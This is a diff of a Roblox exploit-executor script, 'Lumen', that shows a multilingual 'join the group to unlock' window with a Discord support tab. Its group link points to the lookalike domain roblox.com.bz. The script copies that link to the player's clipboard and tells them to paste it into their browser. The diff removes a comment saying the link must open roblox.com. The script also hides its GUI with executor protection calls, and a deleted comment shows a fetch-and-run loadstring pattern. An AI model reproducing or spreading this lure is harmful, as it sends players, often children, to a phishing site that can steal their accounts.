@@ -1,24 +1,30 @@
--- Lumen - group gate window
--- Pick a language (auto-detected), tap Join Group: the link is copied, paste it in your browser and join.
--- Then come back and press "Check Again": if you're in the group, the script unlocks.
--- "-" minimizes to a bubble (tap the bubble to reopen). No close button.
-
------------- CONFIG ------------
 local NAME = "Lumen"
-local GROUP_LINK = "https://roblox.com.bz/communities/9529552772/" -- test it first: it must open roblox.com
+local GROUP_LINK = "https://roblox.com.bz/communities/9529552772/"
 local GROUP_ID = 9529552772
-local GROUP_NAME = "Your Group"   -- only used in the "couldn't copy the link" message
-local MIN_ACCOUNT_AGE_DAYS = 10   -- accounts younger than this are treated as alts. Set to 0 to turn the check off
-local KICK_NEW_ACCOUNTS = true    -- true: kick the new account out of the game. false: just stop the window from showing
-local SKIP_IF_ALREADY_MEMBER = true -- true: players who are already in the group never see the window
-local USE_HTTP_CHECK = false      -- false: safe check (no freezing). true: also use the executor's HTTP request (fresher, but can freeze some mobile executors)
-local KICK_MESSAGE = "New or alt accounts are not allowed. Please use your main account." -- English text (keep it short, Roblox cuts long kick messages); auto-translated to the player's language (see the kick line in each language of STR below)
+local GROUP_NAME = "Your Group"
+local DISCORD_LINK = "https://discord.gg/xytmKe38gT"
+local HAS_DISCORD = DISCORD_LINK ~= "" and not string.find(DISCORD_LINK, "YOUR_INVITE", 1, true)
+local MIN_ACCOUNT_AGE_DAYS = 10
+local KICK_NEW_ACCOUNTS = true
+local SKIP_IF_ALREADY_MEMBER = true
+local USE_HTTP_CHECK = false
+local KICK_MESSAGE = "New or alt accounts are not allowed. Please use your main account."
 
 local function ON_UNLOCK()
-	-- Runs once the player is confirmed to be in the group. Put your script here, for example:
-	-- loadstring(game:HttpGet("https://example.com/your-script.lua"))()
 end
---------------------------------
+
+local task = task or {
+	wait = wait,
+	spawn = function(f, ...) return coroutine.wrap(f)(...) end,
+	delay = function(t, f, ...)
+		local args = { ... }
+		coroutine.wrap(function()
+			wait(t)
+			f(unpack(args))
+		end)()
+	end,
+}
+local unpack = table.unpack or unpack
 
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
@@ -27,8 +33,8 @@ local HttpService = game:GetService("HttpService")
 local StarterGui = game:GetService("StarterGui")
 local Lighting = game:GetService("Lighting")
 local LocalizationService = game:GetService("LocalizationService")
+local GroupService = game:GetService("GroupService")
 
--- setup check: both the link and the group number are needed
 if GROUP_ID == 0 then
 	GROUP_ID = tonumber(string.match(GROUP_LINK, "groups/(%d+)") or string.match(GROUP_LINK, "communities/(%d+)") or "") or 0
 end
@@ -40,9 +46,7 @@ elseif GROUP_ID == 0 then
 end
 if setupError then
 	warn("[" .. NAME .. "] " .. setupError)
-	pcall(function()
-		StarterGui:SetCore("SendNotification", { Title = NAME, Text = setupError, Duration = 10 })
-	end)
+	pcall(StarterGui.SetCore, StarterGui, "SendNotification", { Title = NAME, Text = setupError, Duration = 10 })
 	return
 end
 
@@ -67,16 +71,12 @@ local C = {
 	white = Color3.new(1, 1, 1),
 }
 
----------------- layout ----------------
--- Wide screens (PC, tablets, phones held sideways): sidebar on the left.
--- Narrow portrait phones: a compact window with the tabs in a row under the title bar.
-local function viewportSize()
+local VP = (function()
 	local cam = workspace.CurrentCamera
 	local v = cam and cam.ViewportSize
 	if v and v.X > 50 and v.Y > 50 then return v end
 	return Vector2.new(1280, 720)
-end
-local VP = viewportSize()
+end)()
 local COMPACT = VP.X < 640 and VP.X < VP.Y
 local onTouch = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
 
@@ -88,7 +88,6 @@ local PAGE_W, PAGE_H = W - SIDEBAR, 308
 local PAGE_Y = HEADER + TABBAR
 local H = PAGE_Y + PAGE_H
 
----------------- helpers ----------------
 local function make(class, props, parent)
 	local obj = Instance.new(class)
 	for k, v in pairs(props) do obj[k] = v end
@@ -118,7 +117,6 @@ local function label(props, parent)
 	return make("TextLabel", props, parent)
 end
 
--- text that shrinks to fit instead of getting cut off (long translations)
 local function fitLabel(props, parent, maxSize)
 	props.TextScaled = true
 	local l = label(props, parent)
@@ -126,7 +124,6 @@ local function fitLabel(props, parent, maxSize)
 	return l
 end
 
--- endless gradient rotation from one looping tween (no per-frame code)
 local function spin(grad, seconds)
 	TweenService:Create(grad, TweenInfo.new(seconds, Enum.EasingStyle.Linear, Enum.EasingDirection.Out, -1), { Rotation = 360 }):Play()
 end
@@ -137,11 +134,18 @@ local function sweep(dark, bright)
 end
 
 local function copy(str)
-	local clip = setclipboard or toclipboard
-	return (clip and pcall(clip, str)) or false
+	local fns = {
+		setclipboard, toclipboard, set_clipboard,
+		Clipboard and Clipboard.set,
+		syn and syn.write_clipboard,
+	}
+	for i = 1, 5 do
+		local fn = fns[i]
+		if type(fn) == "function" and pcall(fn, str) then return true end
+	end
+	return false
 end
 
--- hover/press wiring that also resets on touch screens (they have no MouseLeave)
 local function bind(btn, enter, leave, down, up)
 	btn.MouseEnter:Connect(enter)
 	btn.MouseLeave:Connect(leave)
@@ -152,10 +156,19 @@ local function bind(btn, enter, leave, down, up)
 	if up then btn.MouseButton1Up:Connect(up) end
 end
 
----------------- languages ----------------
--- To add a language: add it to LANGS, then copy the "en" block in STR and translate it.
--- Missing lines fall back to English. Languages whose script is missing from the Gotham font
--- (Arabic, Hebrew, Thai, Hindi, Bengali...) use Roblox's fallback fonts, so check how they look.
+local function pressable(hit, hover, press, onEnter, onLeave)
+	local scale = make("UIScale", {}, hit)
+	local function enter()
+		tween(scale, 0.12, { Scale = hover })
+		if onEnter then onEnter() end
+	end
+	bind(hit, enter, function()
+		tween(scale, 0.12, { Scale = 1 })
+		if onLeave then onLeave() end
+	end, function() tween(scale, 0.05, { Scale = press }) end, enter)
+	return scale
+end
+
 local LANGS = {
 	{ "en", "English" },
 	{ "es", "Espa\u{f1}ol" },
@@ -1107,16 +1120,40 @@ local STR = {
 	},
 }
 
-local RTL = { ar = true, he = true, fa = true, ur = true } -- these get a slightly bigger font in the picker
+local DISCORD_STR = {
+	en = { tab_support = "Support", support_sub = "Need help? Join our Discord and ask in the support channel.", discord_btn = "Join Discord", discord_failed = "Couldn't copy. Open %s in your browser." },
+	es = { tab_support = "Soporte", support_sub = "\u{bf}Necesitas ayuda? \u{da}nete a nuestro Discord y pregunta en el canal de soporte.", discord_btn = "Unirse a Discord", discord_failed = "No se pudo copiar. Abre %s en tu navegador." },
+	pt = { tab_support = "Suporte", support_sub = "Precisa de ajuda? Entre no nosso Discord e pergunte no canal de suporte.", discord_btn = "Entrar no Discord", discord_failed = "N\u{e3}o deu para copiar. Abra %s no navegador." },
+	ru = { tab_support = "\u{41f}\u{43e}\u{434}\u{434}\u{435}\u{440}\u{436}\u{43a}\u{430}", support_sub = "\u{41d}\u{443}\u{436}\u{43d}\u{430} \u{43f}\u{43e}\u{43c}\u{43e}\u{449}\u{44c}? \u{417}\u{430}\u{445}\u{43e}\u{434}\u{438} \u{432} \u{43d}\u{430}\u{448} Discord \u{438} \u{43f}\u{438}\u{448}\u{438} \u{432} \u{43a}\u{430}\u{43d}\u{430}\u{43b} \u{43f}\u{43e}\u{434}\u{434}\u{435}\u{440}\u{436}\u{43a}\u{438}.", discord_btn = "\u{417}\u{430}\u{439}\u{442}\u{438} \u{432} Discord", discord_failed = "\u{41d}\u{435} \u{443}\u{434}\u{430}\u{43b}\u{43e}\u{441}\u{44c} \u{441}\u{43a}\u{43e}\u{43f}\u{438}\u{440}\u{43e}\u{432}\u{430}\u{442}\u{44c}. \u{41e}\u{442}\u{43a}\u{440}\u{43e}\u{439} %s \u{432} \u{431}\u{440}\u{430}\u{443}\u{437}\u{435}\u{440}\u{435}." },
+	tr = { tab_support = "Destek", support_sub = "Yard\u{131}ma m\u{131} ihtiyac\u{131}n var? Discord'umuza kat\u{131}l ve destek kanal\u{131}ndan sor.", discord_btn = "Discord'a Kat\u{131}l", discord_failed = "Kopyalanamad\u{131}. Taray\u{131}c\u{131}nda %s adresini a\u{e7}." },
+	ar = { tab_support = "\u{627}\u{644}\u{62f}\u{639}\u{645}", support_sub = "\u{62a}\u{62d}\u{62a}\u{627}\u{62c} \u{645}\u{633}\u{627}\u{639}\u{62f}\u{629}\u{61f} \u{627}\u{646}\u{636}\u{645} \u{625}\u{644}\u{649} \u{627}\u{644}\u{62f}\u{64a}\u{633}\u{643}\u{648}\u{631}\u{62f} \u{648}\u{627}\u{633}\u{623}\u{644} \u{641}\u{64a} \u{642}\u{646}\u{627}\u{629} \u{627}\u{644}\u{62f}\u{639}\u{645}.", discord_btn = "\u{627}\u{646}\u{636}\u{645} \u{625}\u{644}\u{649} \u{62f}\u{64a}\u{633}\u{643}\u{648}\u{631}\u{62f}", discord_failed = "\u{62a}\u{639}\u{630}\u{651}\u{631} \u{627}\u{644}\u{646}\u{633}\u{62e}. \u{627}\u{641}\u{62a}\u{62d} %s \u{641}\u{64a} \u{627}\u{644}\u{645}\u{62a}\u{635}\u{641}\u{62d}." },
+	id = { tab_support = "Bantuan", support_sub = "Butuh bantuan? Gabung Discord kami dan tanya di channel support.", discord_btn = "Gabung Discord", discord_failed = "Gagal menyalin. Buka %s di browser." },
+	vi = { tab_support = "H\u{1ed7} tr\u{1ee3}", support_sub = "C\u{1ea7}n tr\u{1ee3} gi\u{fa}p? H\u{e3}y tham gia Discord c\u{1ee7}a ch\u{fa}ng t\u{f4}i v\u{e0} h\u{1ecf}i \u{1edf} k\u{ea}nh h\u{1ed7} tr\u{1ee3}.", discord_btn = "Tham gia Discord", discord_failed = "Kh\u{f4}ng sao ch\u{e9}p \u{111}\u{1b0}\u{1ee3}c. H\u{e3}y m\u{1edf} %s trong tr\u{ec}nh duy\u{1ec7}t." },
+	fil = { tab_support = "Suporta", support_sub = "Kailangan ng tulong? Sumali sa aming Discord at magtanong sa support channel.", discord_btn = "Sumali sa Discord", discord_failed = "Hindi makopya. Buksan ang %s sa browser." },
+	fr = { tab_support = "Support", support_sub = "Besoin d'aide ? Rejoignez notre Discord et posez votre question dans le salon de support.", discord_btn = "Rejoindre Discord", discord_failed = "Copie impossible. Ouvrez %s dans votre navigateur." },
+	de = { tab_support = "Support", support_sub = "Brauchst du Hilfe? Tritt unserem Discord bei und frage im Support-Kanal.", discord_btn = "Discord beitreten", discord_failed = "Kopieren fehlgeschlagen. \u{d6}ffne %s im Browser." },
+	pl = { tab_support = "Pomoc", support_sub = "Potrzebujesz pomocy? Do\u{142}\u{105}cz do naszego Discorda i napisz na kanale wsparcia.", discord_btn = "Do\u{142}\u{105}cz do Discorda", discord_failed = "Nie uda\u{142}o si\u{119} skopiowa\u{107}. Otw\u{f3}rz %s w przegl\u{105}darce." },
+	it = { tab_support = "Supporto", support_sub = "Serve aiuto? Entra nel nostro Discord e scrivi nel canale supporto.", discord_btn = "Entra su Discord", discord_failed = "Impossibile copiare. Apri %s nel browser." },
+	ko = { tab_support = "\u{c9c0}\u{c6d0}", support_sub = "\u{b3c4}\u{c6c0}\u{c774} \u{d544}\u{c694}\u{d558}\u{c2e0}\u{ac00}\u{c694}? Discord\u{c5d0} \u{cc38}\u{c5ec}\u{d574}\u{c11c} \u{c9c0}\u{c6d0} \u{cc44}\u{b110}\u{c5d0} \u{bb38}\u{c758}\u{d558}\u{c138}\u{c694}.", discord_btn = "Discord \u{cc38}\u{c5ec}", discord_failed = "\u{bcf5}\u{c0ac}\u{c5d0} \u{c2e4}\u{d328}\u{d588}\u{c5b4}\u{c694}. \u{be0c}\u{b77c}\u{c6b0}\u{c800}\u{c5d0}\u{c11c} %s \u{b97c} \u{c5f4}\u{c5b4} \u{c8fc}\u{c138}\u{c694}." },
+	ja = { tab_support = "\u{30b5}\u{30dd}\u{30fc}\u{30c8}", support_sub = "\u{304a}\u{56f0}\u{308a}\u{3067}\u{3059}\u{304b}\u{ff1f}Discord \u{306b}\u{53c2}\u{52a0}\u{3057}\u{3066}\u{3001}\u{30b5}\u{30dd}\u{30fc}\u{30c8}\u{30c1}\u{30e3}\u{30f3}\u{30cd}\u{30eb}\u{3067}\u{8cea}\u{554f}\u{3057}\u{3066}\u{304f}\u{3060}\u{3055}\u{3044}\u{3002}", discord_btn = "Discord \u{306b}\u{53c2}\u{52a0}", discord_failed = "\u{30b3}\u{30d4}\u{30fc}\u{3067}\u{304d}\u{307e}\u{305b}\u{3093}\u{3067}\u{3057}\u{305f}\u{3002}\u{30d6}\u{30e9}\u{30a6}\u{30b6}\u{3067} %s \u{3092}\u{958b}\u{3044}\u{3066}\u{304f}\u{3060}\u{3055}\u{3044}\u{3002}" },
+	zh = { tab_support = "\u{652f}\u{6301}", support_sub = "\u{9700}\u{8981}\u{5e2e}\u{52a9}\u{ff1f}\u{52a0}\u{5165}\u{6211}\u{4eec}\u{7684} Discord\u{ff0c}\u{5728}\u{652f}\u{6301}\u{9891}\u{9053}\u{63d0}\u{95ee}\u{3002}", discord_btn = "\u{52a0}\u{5165} Discord", discord_failed = "\u{590d}\u{5236}\u{5931}\u{8d25}\u{3002}\u{8bf7}\u{5728}\u{6d4f}\u{89c8}\u{5668}\u{4e2d}\u{6253}\u{5f00} %s\u{3002}" },
+	zht = { tab_support = "\u{652f}\u{63f4}", support_sub = "\u{9700}\u{8981}\u{5e6b}\u{52a9}\u{ff1f}\u{52a0}\u{5165}\u{6211}\u{5011}\u{7684} Discord\u{ff0c}\u{5728}\u{652f}\u{63f4}\u{983b}\u{9053}\u{63d0}\u{554f}\u{3002}", discord_btn = "\u{52a0}\u{5165} Discord", discord_failed = "\u{8907}\u{88fd}\u{5931}\u{6557}\u{3002}\u{8acb}\u{5728}\u{700f}\u{89bd}\u{5668}\u{4e2d}\u{958b}\u{555f} %s\u{3002}" },
+	th = { tab_support = "\u{e0a}\u{e48}\u{e27}\u{e22}\u{e40}\u{e2b}\u{e25}\u{e37}\u{e2d}", support_sub = "\u{e15}\u{e49}\u{e2d}\u{e07}\u{e01}\u{e32}\u{e23}\u{e04}\u{e27}\u{e32}\u{e21}\u{e0a}\u{e48}\u{e27}\u{e22}\u{e40}\u{e2b}\u{e25}\u{e37}\u{e2d}? \u{e40}\u{e02}\u{e49}\u{e32}\u{e23}\u{e48}\u{e27}\u{e21} Discord \u{e02}\u{e2d}\u{e07}\u{e40}\u{e23}\u{e32}\u{e41}\u{e25}\u{e49}\u{e27}\u{e16}\u{e32}\u{e21}\u{e43}\u{e19}\u{e0a}\u{e48}\u{e2d}\u{e07}\u{e0b}\u{e31}\u{e1e}\u{e1e}\u{e2d}\u{e23}\u{e4c}\u{e15}", discord_btn = "\u{e40}\u{e02}\u{e49}\u{e32}\u{e23}\u{e48}\u{e27}\u{e21} Discord", discord_failed = "\u{e04}\u{e31}\u{e14}\u{e25}\u{e2d}\u{e01}\u{e44}\u{e21}\u{e48}\u{e2a}\u{e33}\u{e40}\u{e23}\u{e47}\u{e08} \u{e40}\u{e1b}\u{e34}\u{e14} %s \u{e43}\u{e19}\u{e40}\u{e1a}\u{e23}\u{e32}\u{e27}\u{e4c}\u{e40}\u{e0b}\u{e2d}\u{e23}\u{e4c}" },
+	nl = { tab_support = "Support", support_sub = "Hulp nodig? Join onze Discord en vraag het in het supportkanaal.", discord_btn = "Discord joinen", discord_failed = "Kopi\u{eb}ren mislukt. Open %s in je browser." },
+	uk = { tab_support = "\u{41f}\u{456}\u{434}\u{442}\u{440}\u{438}\u{43c}\u{43a}\u{430}", support_sub = "\u{41f}\u{43e}\u{442}\u{440}\u{456}\u{431}\u{43d}\u{430} \u{434}\u{43e}\u{43f}\u{43e}\u{43c}\u{43e}\u{433}\u{430}? \u{41f}\u{440}\u{438}\u{454}\u{434}\u{43d}\u{443}\u{439}\u{441}\u{44f} \u{434}\u{43e} \u{43d}\u{430}\u{448}\u{43e}\u{433}\u{43e} Discord \u{456} \u{43f}\u{438}\u{448}\u{438} \u{432} \u{43a}\u{430}\u{43d}\u{430}\u{43b} \u{43f}\u{456}\u{434}\u{442}\u{440}\u{438}\u{43c}\u{43a}\u{438}.", discord_btn = "\u{41f}\u{440}\u{438}\u{454}\u{434}\u{43d}\u{430}\u{442}\u{438}\u{441}\u{44f} \u{434}\u{43e} Discord", discord_failed = "\u{41d}\u{435} \u{432}\u{434}\u{430}\u{43b}\u{43e}\u{441}\u{44f} \u{441}\u{43a}\u{43e}\u{43f}\u{456}\u{44e}\u{432}\u{430}\u{442}\u{438}. \u{412}\u{456}\u{434}\u{43a}\u{440}\u{438}\u{439} %s \u{443} \u{431}\u{440}\u{430}\u{443}\u{437}\u{435}\u{440}\u{456}." },
+	hi = { tab_support = "\u{938}\u{939}\u{93e}\u{92f}\u{924}\u{93e}", support_sub = "\u{92e}\u{926}\u{926} \u{91a}\u{93e}\u{939}\u{93f}\u{90f}? \u{939}\u{92e}\u{93e}\u{930}\u{947} Discord \u{938}\u{947} \u{91c}\u{941}\u{921}\u{93c}\u{947}\u{902} \u{914}\u{930} \u{938}\u{92a}\u{94b}\u{930}\u{94d}\u{91f} \u{91a}\u{948}\u{928}\u{932} \u{92e}\u{947}\u{902} \u{92a}\u{942}\u{91b}\u{947}\u{902}\u{964}", discord_btn = "Discord \u{91c}\u{949}\u{907}\u{928} \u{915}\u{930}\u{947}\u{902}", discord_failed = "\u{915}\u{949}\u{92a}\u{940} \u{928}\u{939}\u{940}\u{902} \u{939}\u{94b} \u{938}\u{915}\u{93e}\u{964} \u{92c}\u{94d}\u{930}\u{93e}\u{909}\u{91c}\u{93c}\u{930} \u{92e}\u{947}\u{902} %s \u{916}\u{94b}\u{932}\u{947}\u{902}\u{964}" },
+}
+for code, extra in pairs(DISCORD_STR) do
+	for key, text in pairs(extra) do STR[code][key] = text end
+end
 
--- some locale codes Roblox/Windows/phones report differ from the ones used above
+local RTL = { ar = true, he = true, fa = true, ur = true }
+
 local ALIAS = {
 	nb = "no", nn = "no", iw = "he", ["in"] = "id", tl = "fil", mo = "ro", bs = "hr", sh = "sr",
 }
 
--- Roblox tells us the player's language (e.g. "pt-br"), so we can preselect it
 local function detectLanguage()
-	-- ask in a few ways (some executors block one of them) and take the first non-English hit
 	local sources = {
 		function() return LocalPlayer.LocaleId end,
 		function() return LocalizationService.RobloxLocaleId end,
@@ -1135,7 +1172,7 @@ local function detectLanguage()
 	return "en"
 end
 
-local lang = detectLanguage() -- preselected; the player can change it from the Language tab
+local lang = detectLanguage()
 
 local function tr(key, ...)
 	local str = (STR[lang] and STR[lang][key]) or STR.en[key] or key
@@ -1143,27 +1180,25 @@ local function tr(key, ...)
 	return str
 end
 
----------------- group check ----------------
 local function getRequestFn()
-	return (syn and syn.request) or request or http_request or (http and http.request) or (fluxus and fluxus.request)
+	local fns = { syn and syn.request, request, http_request, http and http.request, fluxus and fluxus.request }
+	for i = 1, 5 do
+		if type(fns[i]) == "function" then return fns[i] end
+	end
 end
 
--- true if the local player is in the group.
--- 1) GroupService: Roblox's own call, it waits properly and never freezes the game
--- 2) Player:IsInGroup (can stay cached until you rejoin)
--- 3) optional: the groups web API through the executor's request function. Always fresh, but on some
---    mobile executors this call blocks the whole game, so it is off unless USE_HTTP_CHECK = true
-local GroupService = game:GetService("GroupService")
-
 local function isInGroup()
-	local ok, groups = pcall(function() return GroupService:GetGroupsAsync(LocalPlayer.UserId) end)
+	local ok, groups = pcall(GroupService.GetGroupsAsync, GroupService, LocalPlayer.UserId)
 	if ok and type(groups) == "table" then
 		for _, g in ipairs(groups) do
 			if type(g) == "table" and g.Id == GROUP_ID then return true end
 		end
 	end
 
-	local ok2, result = pcall(function() return LocalPlayer:IsInGroup(GROUP_ID) end)
+	local ok2, result = pcall(function() return LocalPlayer:IsInGroupAsync(GROUP_ID) end)
+	if not ok2 then
+		ok2, result = pcall(function() return LocalPlayer:IsInGroup(GROUP_ID) end)
+	end
 	if ok2 and result == true then return true end
 
 	if USE_HTTP_CHECK then
@@ -1174,7 +1209,7 @@ local function isInGroup()
 				Method = "GET",
 			})
 			if okReq and type(res) == "table" and type(res.Body) == "string" then
-				local okJson, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
+				local okJson, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
 				if okJson and type(data) == "table" and type(data.data) == "table" then
 					for _, entry in ipairs(data.data) do
 						if type(entry) == "table" and type(entry.group) == "table" and entry.group.id == GROUP_ID then
@@ -1195,36 +1230,27 @@ local function runUnlock()
 	end)
 end
 
----------------- alt / new account gate ----------------
--- This script runs on the player's own client, so it can only remove the account that is running it
--- (it cannot kick other players). Account age is the signal: alts are almost always brand new.
 if MIN_ACCOUNT_AGE_DAYS > 0 and LocalPlayer.AccountAge < MIN_ACCOUNT_AGE_DAYS then
 	if KICK_NEW_ACCOUNTS then
-		pcall(function() LocalPlayer:Kick(tr("kick")) end)
+		pcall(LocalPlayer.Kick, LocalPlayer, tr("kick"))
 	else
-		pcall(function()
-			StarterGui:SetCore("SendNotification", { Title = NAME, Text = tr("kick"), Duration = 8 })
-		end)
+		pcall(StarterGui.SetCore, StarterGui, "SendNotification", { Title = NAME, Text = tr("kick"), Duration = 8 })
 	end
 	return
 end
 
--- already in the group: nothing to show, just unlock
 if SKIP_IF_ALREADY_MEMBER and isInGroup() then
-	pcall(function()
-		StarterGui:SetCore("SendNotification", { Title = NAME, Text = tr("already"), Duration = 5 })
-	end)
+	pcall(StarterGui.SetCore, StarterGui, "SendNotification", { Title = NAME, Text = tr("already"), Duration = 5 })
 	runUnlock()
 	return
 end
 
----------------- gui root ----------------
 local function getContainer()
 	if gethui then
 		local ok, ui = pcall(gethui)
 		if ok and ui then return ui end
 	end
-	local ok, core = pcall(function() return game:GetService("CoreGui") end)
+	local ok, core = pcall(game.GetService, game, "CoreGui")
 	if ok and core then return core end
 	return LocalPlayer:WaitForChild("PlayerGui")
 end
@@ -1243,13 +1269,16 @@ local gui = make("ScreenGui", {
 	Name = "LumenGroupGate", ResetOnSpawn = false, DisplayOrder = 100, IgnoreGuiInset = true,
 	ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
 })
+pcall(function()
+	if syn and syn.protect_gui then syn.protect_gui(gui)
+	elseif protectgui then protectgui(gui) end
+end)
 if not pcall(function() gui.Parent = container end) then
 	gui.Parent = LocalPlayer:WaitForChild("PlayerGui")
 end
 
 local conns = {}
 
--- shrink the window on small screens
 local function computeFit()
 	local v = gui.AbsoluteSize
 	if v.X < 50 or v.Y < 50 then return 1 end
@@ -1257,7 +1286,6 @@ local function computeFit()
 end
 local fit = computeFit()
 
--- drag with screen clamping; margin() = how far the center must stay from the screen edges
 local function draggable(handle, target, margin)
 	local dragging, dragStart, origin, moved = false, nil, nil, false
 	handle.InputBegan:Connect(function(input)
@@ -1287,8 +1315,6 @@ local function draggable(handle, target, margin)
 	return function() return moved end
 end
 
----------------- logo ----------------
--- gradient squircle with an "L" and a spark. Everything scales from `size`.
 local function makeLogo(parent, size, position)
 	local u = size / 10
 	local icon = make("Frame", {
@@ -1313,25 +1339,22 @@ local function makeLogo(parent, size, position)
 	local bar, tall, foot = u * 1.5, u * 4.6, u * 3.6
 	local x0, y0 = u * 3, u * 2.4
 	local function piece(w, h, x, y, r)
-		local f = make("Frame", {
+		round(make("Frame", {
 			Size = UDim2.fromOffset(w, h), Position = UDim2.fromOffset(x, y),
 			BackgroundColor3 = C.white, BorderSizePixel = 0,
-		}, icon)
-		round(f, r)
+		}, icon), r)
 	end
-	piece(bar, tall, x0, y0, bar / 2)                                     -- stem
-	piece(foot, bar, x0, y0 + tall - bar, bar / 2)                        -- foot
-	piece(u * 1.3, u * 1.3, u * 6.2, y0 + tall - bar - u * 2.2, u * 1.3)  -- spark
+	piece(bar, tall, x0, y0, bar / 2)
+	piece(foot, bar, x0, y0 + tall - bar, bar / 2)
+	piece(u * 1.3, u * 1.3, u * 6.2, y0 + tall - bar - u * 2.2, u * 1.3)
 end
 
----------------- window + soft shadow ----------------
 local root = make("Frame", {
 	Size = UDim2.fromOffset(W, H), Position = UDim2.fromScale(0.5, 0.5),
 	AnchorPoint = Vector2.new(0.5, 0.5), BackgroundTransparency = 1, BorderSizePixel = 0,
 }, gui)
 local rootScale = make("UIScale", { Scale = fit * 0.94 }, root)
 
--- stacked rounded layers = a soft shadow that always matches the corner radius (no image needed)
 local shadowLayers = {}
 for i = 1, 8 do
 	local grow = i * 7
@@ -1354,11 +1377,9 @@ local window = make("CanvasGroup", {
 	GroupTransparency = 1, ZIndex = 1,
 }, root)
 round(window, CORNER)
--- (a stroke on a CanvasGroup ignores GroupTransparency, so it's faded on its own)
 local windowStroke = stroke(window, C.white, 1.5, 1)
 spin(make("UIGradient", { Color = sweep(Color3.fromRGB(40, 40, 54), C.accent) }, windowStroke), 6)
 
--- ambient glows
 local function glow(color, height, atBottom, from, to)
 	local f = make("Frame", {
 		Size = UDim2.new(1, 0, 0, height), BackgroundColor3 = color, BorderSizePixel = 0,
@@ -1373,7 +1394,6 @@ end
 glow(C.accent, 130, false, 0.84, 1)
 glow(C.accent2, 110, true, 1, 0.9)
 
----------------- header (title bar) ----------------
 local header = make("Frame", { Size = UDim2.new(1, 0, 0, HEADER), BackgroundTransparency = 1 }, window)
 makeLogo(header, 26, UDim2.fromOffset(18, 11))
 label({
@@ -1381,88 +1401,103 @@ label({
 	TextColor3 = C.text, Font = Enum.Font.GothamBold, TextSize = 15, TextXAlignment = Enum.TextXAlignment.Left,
 }, header)
 
-local function headerButton(offsetX, caption, size)
-	local btn = make("TextButton", {
-		Size = UDim2.fromOffset(34, 34), Position = UDim2.new(1, offsetX, 0, 7),
-		BackgroundColor3 = C.surface, BackgroundTransparency = 1, Text = caption, TextColor3 = C.muted,
-		Font = Enum.Font.GothamBold, TextSize = size, AutoButtonColor = false, BorderSizePixel = 0,
-	}, header)
-	round(btn, 9)
-	bind(btn,
-		function() tween(btn, 0.12, { BackgroundTransparency = 0, TextColor3 = C.text }) end,
-		function() tween(btn, 0.12, { BackgroundTransparency = 1, TextColor3 = C.muted }) end)
-	return btn
-end
-local minBtn = headerButton(-46, "\u{2013}", 18)
+local minBtn = make("TextButton", {
+	Size = UDim2.fromOffset(34, 34), Position = UDim2.new(1, -46, 0, 7),
+	BackgroundColor3 = C.surface, BackgroundTransparency = 1, Text = "\u{2013}", TextColor3 = C.muted,
+	Font = Enum.Font.GothamBold, TextSize = 18, AutoButtonColor = false, BorderSizePixel = 0,
+}, header)
+round(minBtn, 9)
+bind(minBtn,
+	function() tween(minBtn, 0.12, { BackgroundTransparency = 0, TextColor3 = C.text }) end,
+	function() tween(minBtn, 0.12, { BackgroundTransparency = 1, TextColor3 = C.muted }) end)
 
-make("Frame", { -- line under the title bar
-	Size = UDim2.new(1, 0, 0, 1), Position = UDim2.fromOffset(0, HEADER - 1),
-	BackgroundColor3 = C.stroke, BackgroundTransparency = 0.4, BorderSizePixel = 0,
-}, window)
+do
+	local CHIP_W, CHIP_H, AV = COMPACT and 150 or 176, 36, 30
+	local chip = make("Frame", {
+		Size = UDim2.fromOffset(CHIP_W, CHIP_H), AnchorPoint = Vector2.new(1, 0.5),
+		Position = UDim2.new(1, -54, 0.5, 0), BackgroundColor3 = C.surface,
+		BackgroundTransparency = 0.25, BorderSizePixel = 0,
+	}, header)
+	round(chip, CHIP_H / 2)
+	stroke(chip, C.stroke, 1, 0.2)
+
+	local avatar = make("Frame", {
+		Size = UDim2.fromOffset(AV, AV), Position = UDim2.fromOffset(3, 3),
+		BackgroundColor3 = C.accent, BackgroundTransparency = 0.6, BorderSizePixel = 0,
+	}, chip)
+	round(avatar, AV / 2)
+	label({
+		Size = UDim2.fromScale(1, 1), Text = string.upper(string.sub(LocalPlayer.Name, 1, 1)),
+		TextColor3 = C.text, Font = Enum.Font.GothamBold, TextSize = 14,
+	}, avatar)
+	local pic = make("ImageLabel", {
+		Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, BorderSizePixel = 0,
+		Image = "", ImageTransparency = 1, ZIndex = 2,
+	}, avatar)
+	round(pic, AV / 2)
+
+	fitLabel({
+		Size = UDim2.new(1, -50, 0, 16), Position = UDim2.fromOffset(40, 4),
+		Text = LocalPlayer.DisplayName ~= "" and LocalPlayer.DisplayName or LocalPlayer.Name,
+		TextColor3 = C.text, Font = Enum.Font.GothamBold, TextXAlignment = Enum.TextXAlignment.Left,
+	}, chip, 12)
+	fitLabel({
+		Size = UDim2.new(1, -50, 0, 12), Position = UDim2.fromOffset(40, 20), Text = "@" .. LocalPlayer.Name,
+		TextColor3 = C.muted, TextXAlignment = Enum.TextXAlignment.Left,
+	}, chip, 10)
+
+	task.spawn(function()
+		local ok, img = pcall(Players.GetUserThumbnailAsync, Players, LocalPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
+		pic.Image = (ok and type(img) == "string" and img ~= "") and img
+			or ("rbxthumb://type=AvatarHeadShot&id=" .. LocalPlayer.UserId .. "&w=150&h=150")
+		tween(pic, 0.3, { ImageTransparency = 0 })
+	end)
+end
+
+local function divider(size, position)
+	make("Frame", {
+		Size = size, Position = position, BackgroundColor3 = C.stroke, BackgroundTransparency = 0.4, BorderSizePixel = 0,
+	}, window)
+end
+divider(UDim2.new(1, 0, 0, 1), UDim2.fromOffset(0, HEADER - 1))
 if COMPACT then
-	make("Frame", { -- line under the tab row
-		Size = UDim2.new(1, 0, 0, 1), Position = UDim2.fromOffset(0, PAGE_Y - 1),
-		BackgroundColor3 = C.stroke, BackgroundTransparency = 0.4, BorderSizePixel = 0,
-	}, window)
+	divider(UDim2.new(1, 0, 0, 1), UDim2.fromOffset(0, PAGE_Y - 1))
 else
-	make("Frame", { -- line between the sidebar and the pages
-		Size = UDim2.new(0, 1, 1, -HEADER), Position = UDim2.fromOffset(SIDEBAR, HEADER),
